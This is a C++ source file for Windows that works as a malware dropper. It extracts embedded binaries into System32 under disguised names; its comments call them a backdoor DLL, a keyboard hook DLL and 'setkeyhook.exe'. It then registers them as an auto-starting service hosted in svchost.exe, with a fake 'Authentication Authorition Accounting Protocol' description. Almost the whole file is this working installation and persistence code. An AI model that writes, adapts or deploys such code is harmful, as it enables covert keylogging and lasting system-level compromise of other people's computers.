// test svchost.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "resource.h"
#include <string>
#include <Strsafe.h>
#include <windows.h>
#include <string.h>
#include<iostream>
using namespace std;

#pragma comment(lib,"Advapi32.lib")

char ServiceName[16] = "MhSvc";
char ServiceGroup[16] = "netsvcs";
//用于修改字符类型键值

BOOL Is64Sys() {
	SYSTEM_INFO si;
	GetNativeSystemInfo(&si);

	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64
		|| si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		return TRUE;
	else
		return FALSE;
}
int RemoveGroupService()
{
	HKEY hRoot = NULL;

	if (RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost",
		0,
		KEY_ALL_ACCESS,
		&hRoot) != ERROR_SUCCESS) {
		return FALSE;
	}
	char  Data[1024];
	char *p;
	DWORD keyType = REG_SZ;//定义数据类型
	DWORD DataLen = sizeof(Data);//定义数据长度
	RegQueryValueEx(hRoot, ServiceGroup, 0, &keyType, (LPBYTE)Data, &DataLen);


	p = Data + DataLen - 2 - strlen(ServiceName);
	if (strncmp(p, ServiceName, 16) == 0)
	{
		if (ERROR_SUCCESS != RegSetValueEx(hRoot, ServiceGroup, 0, REG_MULTI_SZ, (BYTE*)&Data, DataLen - strlen(ServiceName) - 1))
		{
			return FALSE;
		}
	}
	RegCloseKey(hRoot);
	return TRUE;
}
int InstallGroupService()
{
	HKEY hRoot = NULL;
	if (RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost",
		0,
		KEY_ALL_ACCESS,
		&hRoot) != ERROR_SUCCESS) {
		return FALSE;
	}
	char  Data[1024];
	char *p;
	DWORD keyType = REG_SZ;//定义数据类型
	DWORD DataLen = sizeof(Data);//定义数据长度
	RegQueryValueEx(hRoot, ServiceGroup, 0, &keyType, (LPBYTE)Data, &DataLen);

	p = Data + DataLen - 2 - strlen(ServiceName);
	if (strncmp(p, ServiceName, 16) == 0)
	{
		return TRUE;
	}

	p = Data + DataLen - 1;
	strcpy(p, ServiceName);
	p = p + strlen(ServiceName);
	int dou2;
	dou2 = (DataLen - 1) * 2;
	for (; dou2 <= (DataLen + strlen(ServiceName)) * 2 + 1; dou2++)
	{
		if ((dou2 % 2 == 0) && (dou2 <= (DataLen + strlen(ServiceName)) * 2 - 4))
		{
			Data[dou2] = Data[dou2 / 2];
		}
		else
		{
			Data[dou2] = 0;
		}
	}
	p[0] = 0;
	p[1] = 0;
	if (ERROR_SUCCESS != RegSetValueEx(hRoot, ServiceGroup, 0, REG_MULTI_SZ, (BYTE*)&Data, DataLen + strlen(ServiceName) + 1))
	{
		return FALSE;
	}
	RegCloseKey(hRoot);
	return FALSE;
}
int RemoveService()
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	SERVICE_STATUS NServiceStatus;

	RemoveGroupService();

	//打开服务控制管理器数据库
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL)
		return 0;
	//打开服务
	schService = OpenService(schSCManager, ServiceName, SERVICE_ALL_ACCESS);
	if (schService == NULL)
		return 0;
	//查询服务状态
	QueryServiceStatus(schService, &NServiceStatus);
	//如果服务正在运行就停止服务
	if (NServiceStatus.dwCurrentState == SERVICE_RUNNING)
	{
		ControlService(schService, SERVICE_CONTROL_STOP, &NServiceStatus);
	}
	//删除服务
	if (DeleteService(schService))
	{
		printf("remove service Successed");
		//关闭打开的句柄
		CloseServiceHandle(schSCManager);
		CloseServiceHandle(schService);
		return 0;
	}
	else
	{
		printf("remove service Failed");
		//关闭打开的句柄
		CloseServiceHandle(schSCManager);
		CloseServiceHandle(schService);
		return 0;
	}
}

int InstallService()
{
	DWORD            dwErrorCode;
	// 在服务组进程中添加自己的服务，选择的是netsvcs

	HKEY hRoot = NULL;


	InstallGroupService();

	SC_HANDLE hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hscm == NULL) {
		return FALSE;
	}
	char wszBinPath[MAX_PATH] = { 0 };
	if (Is64Sys()) {
		GetSystemWow64Directory(wszBinPath, MAX_PATH);
		strcat(wszBinPath, "\\svchost.exe -k ");
	}
	else {
		GetSystemDirectory(wszBinPath, MAX_PATH);
		strcat(wszBinPath, "\\svchost.exe -k ");
	}
	strcat(wszBinPath, ServiceGroup);

	SC_HANDLE scHService = CreateService(
		hscm,                        // SCManager database 
		ServiceName,                    // name of service 
		ServiceName,           // service name to display 
		SERVICE_ALL_ACCESS,        // desired access 
		SERVICE_WIN32_SHARE_PROCESS, // service type 
		SERVICE_AUTO_START,      // start type 
		SERVICE_ERROR_NORMAL,      // error control type 
		wszBinPath,         // service's binary 
		NULL,                      // no load ordering group 
		NULL,                      // no tag identifier 
		NULL,                      // no dependencies 
		NULL,                      // LocalSystem account 
		NULL);                     // no password 
	SERVICE_DESCRIPTION ServiceDesc;
	char szDescription[MAX_PATH] = { 0 };
	strcpy(szDescription, "Authentication Authorition Accounting Protocol");
	ServiceDesc.lpDescription = szDescription;
	ChangeServiceConfig2(scHService, SERVICE_CONFIG_DESCRIPTION, &ServiceDesc);
	if (scHService == NULL) {
		dwErrorCode = GetLastError();
		if (dwErrorCode != ERROR_SERVICE_EXISTS)
		{
			printf("created service failed ");
			CloseServiceHandle(hscm);
			return 0;
		}
		//如果服务存在
		else
		{
			//假如服务已存在则打开服务
			scHService = OpenService(hscm, ServiceName, SERVICE_START);
			//打开失败
			if (scHService == NULL)
			{
				printf("start service failed");
				CloseServiceHandle(hscm);
				return 0;
			}
		}
	}

	//config service
	char wsRegPath[MAX_PATH];
	strcpy(wsRegPath, "SYSTEM\\CurrentControlSet\\Services\\");
	strcat(wsRegPath, ServiceName);

	if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_LOCAL_MACHINE, wsRegPath,
		0, KEY_ALL_ACCESS, &hRoot)) {
		return FALSE;
	}
	HKEY hSubKey = NULL;
	if (ERROR_SUCCESS != RegCreateKey(hRoot, "Parameters", &hSubKey)) {
		return FALSE;
	}
	//char wsDllFilePath[MAX_PATH] = "D:\\visual Studio project\\SVChost\\Release\\SVChost.dll";
	//char wsDllFilePath[MAX_PATH] = "D:\\visual Studio project\\assembledll\\Release\\assembledll.dll";
	char wsDllFilePath[MAX_PATH];
	GetSystemDirectory(wsDllFilePath, MAX_PATH);
	strcat(wsDllFilePath, "\\mastrv.dll");
	//GetModuleFileName(NULL, wsDllFilePath, MAX_PATH);//    This is a exe not a dll
	if (ERROR_SUCCESS != RegSetValueEx(hSubKey, "ServiceDll", 0, REG_EXPAND_SZ,
		(BYTE*)wsDllFilePath, MAX_PATH)) {
		return FALSE;
	}
	StartService(scHService, 0, NULL);
	CloseHandle(hRoot);
	CloseHandle(hSubKey);
	CloseServiceHandle(scHService);
	CloseServiceHandle(hscm);
}
void RescourceToFile(char *filename, char *Name, char*Type)
{
	HRSRC hRes = FindResource(NULL, Name, Type);
	if (hRes == NULL)
	{
		return;
	}

	HGLOBAL hgRes = LoadResource(NULL, hRes);
	if (hgRes == NULL)
	{
		return;
	}
	void *pRes = LockResource(hgRes);
	if (pRes == NULL)
	{
		return;
	}
	DWORD size = SizeofResource(NULL, hRes);
	if (size == 0)
	{
		return;
	}
	HANDLE hFile = CreateFile(filename,
		GENERIC_WRITE, 0, 0,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	DWORD dwWrite;
	if (!WriteFile(hFile, pRes, size, &dwWrite, 0))
	{
		return;
	}
	CloseHandle(hFile);
	//GlobalFree(hgRes);
}
int main()
{
	char targetdll1[MAX_PATH],targetdll2[MAX_PATH];
	GetSystemDirectory(targetdll1, MAX_PATH);
	strcat(targetdll1, "\\mastrv.dll");// this is assembleDll
	RescourceToFile(targetdll1, MAKEINTRESOURCE(IDR_BACKDLL1), MAKEINTRESOURCE(backDll));

	GetSystemDirectory(targetdll1, MAX_PATH);
	strcat(targetdll1, "\\mseas.dll");//this is keyboard.dll
	RescourceToFile(targetdll1, MAKEINTRESOURCE(IDR_2561), MAKEINTRESOURCE(backDll));

	GetSystemDirectory(targetdll1, MAX_PATH);
	strcat(targetdll1, "\\mestr.exe");//this is setkeyhook.exe
	RescourceToFile(targetdll1, MAKEINTRESOURCE(IDR_2562), MAKEINTRESOURCE(backDll));
	
	InstallService();
//	RemoveService();
	return 0;
}
